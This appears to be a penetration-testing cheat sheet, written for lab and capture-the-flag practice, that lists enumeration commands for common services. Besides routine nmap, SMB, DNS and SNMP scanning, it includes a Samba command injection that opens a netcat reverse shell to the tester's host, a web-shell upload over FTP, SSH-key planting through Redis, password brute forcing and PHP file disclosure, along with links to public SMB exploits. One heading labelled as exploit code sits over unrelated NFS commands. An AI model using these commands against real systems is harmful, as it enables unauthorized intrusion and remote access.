---
title: "Enumeration/Scanning"
date: 2022-08-05 
categories: ["Cheat sheet"]
tags: [nmap, ftp, ssh, telnet, smtp, dns, dnsenum, rpc, smb, snmp, irc, mysql, redis]     # TAG names should always be lowercase
---


# Enumeration/Scanning
This is the second phase of hacking where by it includes scanning the target and enumerating services. 

## **Port Scanning :**
```
1. nmap -sC -sV -o nmap -A -T5 10.10.10.x
2. Host Discovery
   •  nmap -sn 10.10.1.1-254 -vv -oA hosts
   •  netdiscover -r 10.10.10.0/24
   
3. DNS server discovery
   •  nmap -p 53 10.10.10.1-254 -vv -oA dcs
   
4. NSE Scripts Scan 
   * nmap -sV --script=vulscan/vulscan.nse (https://securitytrails.com/blog/nmap-vulnerability-scan)
   
5. Port specific NSE script list :

   ls /usr/share/nmap/scripts/ssh*
   ls /usr/share/nmap/scripts/smb*
```
## TCP Scanning
To illustrate this, we will run a TCP Netcat port scan on ports 3388-3390. The **-w** option specifies the connection timeout in seconds and **-z** is used to specify zero-I/O mode, which will send no data and is used for scanning:
```
nc -nvv -w 1 -z <IP> 3388-3390
```
## UDP Scanning
Let’s run a UDP Netcat port scan against ports 160-162 on a target. This is done using the only **nc** option **-u**, which indicates a UDP scan:
```
nc -nv -u -z -w 1 <IP> 160-162

nmap -sU TARGET
```
Most UDP scanners tend to use the standard “ICMP port unreachable” message to infer the status of a target port. However, this method can be completely unreliable when the target port is filtered by a firewall. In fact, in these cases the scanner will report the target port as open because of the
absence of the ICMP message.
## **Scanning all 65535 ports** : 
```
1. masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
2. nmap -Pn -sV -sC -p$ports 10.10.10.x

3. Running specific NSE scripts :
    nmap -Pn -sC -sV --script=vuln*.nse -p$ports <IP> -T5 -A
```

## **FTP : (Port 21)**

```
1. anonymous login check.
     ftp <ip address>
     username : anonymous
     pwd : anonymous
     file upload -> put shell.php
```
## **SSH : (Port 22)**
id_rsa.pub : Public key that can be used in authorized_keys for login
id_rsa : Private key that is used for login. Password can be cracked with ssh2john and john
```
id_rsa
ssh -i id_rsa user@10.10.10.x
For passwordless login, add id_rsa.pub to target's authorized_keys
ssh2john
```
## Telnet:(23)
* **Banner Grab**
```
nc -vn <IP> 23
```
* **Using nmap script**

```
nmap -n -sV -Pn --script "*telnet*" -p 23 <IP>
```
## SMTP: (25,465(ssl),587(ssl))
* **Banner grabbing**

```
nc -vn <IP> 25
```
* **Using nmap script**

```
nmap -p25 --script smtp-commands <IP>
nmap --script smtp-enum-users <IP>
```
* **Other techniques**

```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
```
## **DNS Zone transfer check : (Port 53)**
If port 53 is open:
```
1. Add host to /etc/hosts
2. dig axfr smasher.htb @10.10.10.135
     https://ghostphisher.github.io/smasher2
3. Add the extracted domain to /etc/hosts and dig again
```
* ***Dnsrecon***
Running dnsrecon against `target.com` using the **-d** option to specify a domain name, and **-t** to specify the type of enumeration to perform
```
dnsrecon -d <target.com> -t axfr
```
* ***Brute forcing using dnsrecon***
We will use the **-d** option to specify a domain name, **-D** to specify a file name containing potential subdomain strings, and **-t** to specify the type of enumeration to perform (in this case brt for brute force):

```
 dnsrecon -d <target.com> -D ~/list.txt -t brt
```
* ***DNSenum***
```
 dnsenum <target.com>
```
* ***using nmap***

```
nmap --script=dns-zone-transfer -p 53 <target's ns>
```
## **RPC Bind (111)**
```
rpcclient --user="" --command=enumprivs -N <IP>
rpcinfo –p <IP>
rpcbind -p <IP> 
```
## **RPC (135)**

```
rpcdump.py <IP> -p 135
rpcdump.py <IP> -p 135 | grep ncacn_np // get pipe names
rpcmap.py ncacn_ip_tcp:<IP>[135]
```

## **SMB (139 & 445)**
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

```
1. nmap --script smb-protocols <IP>
   nmap -v -p 139,445 -oG smb.txt 192.168.11.200-254

2.smbclient -L //<IP>
3. smbclient -L //<IP> -N        // No password (SMB Null session)
4. smbclient //MOUNT/share -I target -N
5. smbclient --no-pass -L <IP>
6. smbclient //<IP>/share_name

7 smbmap -H <IP>
8. smbmap -H <IP> -u '' -p ''
9. smbmap -H <IP> -s share_name 

10. crackmapexec smb <IP> -u '' -p '' --shares
11. crackmapexec smb <IP> -u 'sa' -p '' --shares
12. crackmapexec smb <IP> -u 'sa' -p 'sa' --shares
13. crackmapexec smb <IP> -u '' -p '' --share share_name
14. crackmapexec smb 192.168.0.115 -u '' -p '' --shares --pass-pol


15.enum4linux -a <IP>

16. rpcclient -U "" <IP>
    * enumdomusers 
    * enumdomgroups
    * queryuser [rid]
    * getdompwinfo
    * getusrdompwinfo [rid]

17. ncrack -u username -P rockyou.txt -T 5 <IP> -p smb -v

18. mount -t cifs "//<IP>/share/" /mnt/wins

19. mount -t cifs "//<IP>/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid=0

20. SMB Shell to Reverse Shell : 

    smbclient -U "username%password" //<IP>/sharename
    smb> logon “/=nc <IP> 4444 -e /bin/bash" 
    
Checklist :
    * Samba symlink directory traversal attack
```
* **Fingerprint SMB Version**
```
smbclient -L //<IP>
```
* **Find open SMB Shares**
```
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24 
```
* **Enumerate SMB Users**

```
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
```
* **List shares**

```
smbmap -H [ip/hostname]
echo exit | smbclient -L \\\\[ip]
nmap --script smb-enum-shares -p 139,445 <IP>
```
* **Check for null sessions**

```
smbmap -H [ip/hostname]
rpcclient -U "" -N <IP>
smbclient \\\\[ip]\\[share name]
```
* **SMB Exploits :**
1. Samba "username map script" Command Execution - CVE-2007-2447
    * Version 3.0.20 through 3.0.25rc3
    * Samba-usermap-exploit.py - https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851
2. Eternal Blue - CVE-2017-0144
    * SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016
https://github.com/adithyan-ak/MS17-010-Manual-Exploit
3. SambaCry - CVE-2017-7494
    * 4.5.9 version and before
    * https://github.com/opsxcq/exploit-CVE-2017-7494
* **OTHER TOOLS**

> **nmblookup** - collects NetBIOS over TCP/IP client used to lookup NetBIOS names.
**smbclient**- an ftp-like client to access SMB shares
**nmap** - general scanner, with scripts
**rpcclient** - tool to execute client side MS-RPC functions
**enum4linux** - enumerates various smb functions
wireshark

## **SNMP (161)** 
```
1. snmpwalk -c public -v1 <IP>
2. snmpcheck -t <IP> -c public
3. onesixtyone -c names -i hosts
4. nmap -sT -p 161 <IP> -oG snmp_results.txt
5. snmpenum -t <IP>
```
## **IRC (194,6667,6660-7000)**
```
1. nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
2. https://github.com/Ranger11Danger/UnrealIRCd-
```

## **3.2.8.1-Backdoor (exploit code)**
```
1. NFS (2049)
2. showmount -e <IP>
3. mkdir /mnt/nfs
4. mount -t nfs <IP>:/nfspath-shown /mnt/nfs
5. Permission Denied ? (https://blog.christophetd.fr/write-up-vulnix/)
```

## **MYSQL (3306)**
* ```
 nmap -sV -Pn -vv <IP> -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```

## **Redis (6379)**
In the output of config get * you could find the home of the redis user (usually /var/lib/redis or /home/redis/.ssh), and knowing this you know where you can write the authenticated_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it: 

1. Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa
2. Write the public key to a file : (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
3. Import the file into redis : cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit 
4. Save the public key to the authorized_keys file on redis server:

```
root@Urahara:~# redis-cli -h <IP>

10.85.0.52:6379> config set dir /home/test/.ssh/
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

## **Port Knocking :**
```
TCP
knock -v <ip> 4 27391 159

UDP
knock -v <IP> 4 27391 159 -u

TCP & UDP
knock -v <IP> 159:udp 27391:tcp 4:udp
```

# OTHER TECHNIQUES
* **IP DISCOVERY**
```
netdiscover -r 10.0.2.0/24
nmap -sP 10.195.0.0/16 // ping discovery scan
```
*  **connect to a UDP port**
`nc -u localhost 161`

* **WINDOWS**
search for files
`C:\> dir /s /b network-secret.txt`

* **Finding files**
```
Find SUID files ---> find / -perm -4000 -type f 2>/dev/null
Find SUID files owned by root ---> find / -uid 0 -perm -4000 -type f 2>/dev/null   
Find files with GUID bit set ---> find / -perm -2000 -type f 2>/dev/null      
Find world-writable files ---> find / -perm -2 -type f 2>/dev/null         
Find word-writable directories ---> find / -perm -2 -type d 2>/dev/null         
Find rhost config files ---> find /home –name .rhosts -print 2>/dev/null    
list files recursively ---> ls -ahlR /root/      
```
* **PHP**
Read PHP source code with php://filter
```
http://<IP>/?page=upload   // original page
http://<IP>/?page=php://filter/convert.base64-encode/resource=upload
curl http://<IP>/?page=php://filter/convert.base64-encode/resource=upload
 ``` 
>  The result needs to be decoded from Base64





Other recourses can be found here https://github.com/R0B1NL1N/OSCP-note/blob/master/ENUMERATION/enumeration